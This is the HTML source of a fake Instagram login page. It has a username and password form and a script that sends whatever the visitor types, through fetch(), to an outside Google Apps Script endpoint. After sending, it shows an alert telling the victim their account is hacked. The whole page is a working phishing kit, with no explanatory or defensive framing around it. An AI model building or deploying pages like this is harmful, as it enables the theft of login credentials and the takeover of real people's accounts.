<!DOCTYPE html>
<html lang="en">

    <link rel="stylesheet" href="style.css" />

      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"

  <body>
    <div class="container">
      <div class="center">
        <div class="header">
          <img src="instagramlogo.png" alt="instagramLogo" class="instaLogo" />
        </div>
        <form method="post" action="" name="google-sheet" class="form">
        <div class="inputElement">
          <input type="text" name="username" placeholder="Phone number,username or email"   class="inputText" required/>
          <input type="password" name="password" placeholder="Password" class="inputText" required/>
          <input type="submit" value="Log in" class="inputButton" />
        </form>
          <div class="line">
            <span class="arrow"></span>
            <span class="content">OR</span>
            <span class="arrow"></span>
          </div>
          <div class="social__icon">
            <i class="fab fa-facebook-square"></i
            ><span>Log in with facebook</span>
          </div>
          <div class="forgetPassword">Forget Password?</div>
        </div>
      </div>
      <div class="footer">
        <p>Don't have a accout?<span>Sign Up</span></p>
      </div>
    </div>
</section>
<script>

    const scriptURL = 'https://script.google.com/macros/s/AKfycbx0L1vPAE197hbysBAMBQC_MWmr4brQ71lhOmYYgevnbpWox2qtvcB0dP88GWtZfwsV/exec'
    const form = document.forms['google-sheet']

    form.addEventListener('submit', e => {
    e.preventDefault()
    fetch(scriptURL, { method: 'POST', body: new FormData(form)})
    .then(response => alert("Harrry Your Account is Hacked.."))
    .catch(error => console.error('Error', error.message))
})
</script>
</body>
